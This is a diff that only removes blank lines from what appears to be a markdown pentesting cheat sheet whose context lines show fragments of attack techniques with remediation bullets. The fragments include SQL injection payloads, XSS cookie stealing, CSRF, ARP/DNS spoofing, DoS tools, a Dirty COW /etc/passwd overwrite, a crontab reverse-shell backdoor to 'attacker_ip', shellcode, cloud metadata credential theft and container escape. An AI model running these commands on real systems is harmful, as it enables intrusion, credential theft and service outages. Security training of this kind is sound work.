@@ -24,7 +24,6 @@ admin' --
 ' AND 1=2
 ```
 
-
 **Exploitation:**
 ```sql
 -- Database enumeration
@@ -40,7 +39,6 @@ admin' --
 ' AND SLEEP(5)--
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
 ```
-
 
 **Remediation:**
 - Use parameterized queries
@@ -67,7 +65,6 @@ admin' --
 <iframe src="javascript:alert('XSS')">
 ```
 
-
 **Exploitation:**
 ```javascript
 // Cookie stealing
@@ -90,7 +87,6 @@ document.addEventListener('keypress', function(e) {
   </form>
 </div>
 ```
-
 
 **Remediation:**
 - Output encoding (HTML, JavaScript, URL)
@@ -125,7 +121,6 @@ fetch('http://bank.com/transfer', {
 </script>
 ```
 
-
 **Remediation:**
 - Anti-CSRF tokens
 - SameSite cookie attribute
@@ -155,7 +150,6 @@ for password in wordlist:
         break
 ```
 
-
 **Default Credentials:**
 - `admin:admin`
 - `admin:password`
@@ -174,7 +168,6 @@ curl -b cookies.txt -c new_cookies.txt http://target.com/set_session?ID=ATTACKER
 # Login and get valid session with fixed ID
 curl -b new_cookies.txt http://target.com/login
 ```
-
 
 **Remediation:**
 - Multi-factor authentication
@@ -198,7 +191,6 @@ arpspoof -i eth0 -t target_ip gateway_ip
 tcpdump -i eth0 -w capture.pcap
 ```
 
-
 **DNS Spoofing:**
 ```bash
 # dnsspoof
@@ -207,7 +199,6 @@ dnsspoof -i eth0 -f /etc/dnsspoof.conf
 # /etc/dnsspoof.conf example
 *.target.com 10.0.0.1
 ```
-
 
 **Remediation:**
 - HTTPS with valid certificates
@@ -238,7 +229,6 @@ while True:
     s.close()
 ```
 
-
 **HTTP Flood:**
 ```bash
 # Slowloris attack
@@ -247,7 +237,6 @@ slowloris -dns target.com -port 80
 # GoldenEye
 goldeneye.py http://target.com -w 500 -m 50
 ```
-
 
 **Remediation:**
 - Rate limiting
@@ -274,7 +263,6 @@ gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt
 ./dirtyc0w /etc/passwd root:$(openssl passwd -1 newpass):0:0:root:/root:/bin/bash
 ```
 
-
 **SUID Binaries:**
 ```bash
 # Find SUID files
@@ -293,7 +281,6 @@ vi
 :!sh
 ```
 
-
 **Cron Jobs:**
 ```bash
 # Check cron jobs
@@ -304,7 +291,6 @@ ls -la /etc/cron.*
 # If writable, create backdoor
 echo "* * * * * root /bin/bash -c 'nc -e /bin/sh attacker_ip 4444'" >> /etc/crontab
 ```
-
 
 **Remediation:**
 - Keep kernel and software updated
@@ -333,7 +319,6 @@ buffer += b"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43
 vulnerable_function(buffer)
 ```
 
-
 **Remediation:**
 - Use safe functions (strncpy instead of strcpy)
 - Stack canaries
@@ -356,7 +341,6 @@ cipher = ARC4.new(key)
 # If attacker knows plaintext and ciphertext, they can recover key
 ```
 
-
 **Hash Collision:**
 ```python
 #!/usr/bin/env python3
@@ -372,7 +356,6 @@ hash2 = hashlib.md5(data2).hexdigest()
 
 # hash1 == hash2 even though data1 != data2
 ```
-
 
 **Remediation:**
 - Use strong encryption (AES-256)
@@ -392,7 +375,6 @@ curl -d "encrypted_data" https://target.com/decrypt
 padbuster https://target.com/decrypt ENCRYPTED_DATA 16 -cookies "JSESSIONID=xxx"
 ```
 
-
 **Remediation:**
 - Use constant-time comparison
 - Don't reveal padding errors
@@ -409,7 +391,6 @@ curl https://api.target.com/users
 # Try to find leaked keys in GitHub
 githubsearch "sk_live_" "target.com"
 ```
-
 
 ### GraphQL Injection
 ```graphql
@@ -442,7 +423,6 @@ query {
 }
 ```
 
-
 **Remediation:**
 - Disable introspection in production
 - Query complexity limiting
@@ -460,7 +440,6 @@ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Get temporary credentials and access other AWS resources
 ```
 
-
 ### Container Escape
 ```bash
 # Privileged container escape
@@ -474,7 +453,6 @@ mount /dev/sda1 /mnt/host
 docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu:latest bash
 docker ps  # Can see host containers
 ```
-
 
 **Remediation:**
 - Disable instance metadata service (if not needed)
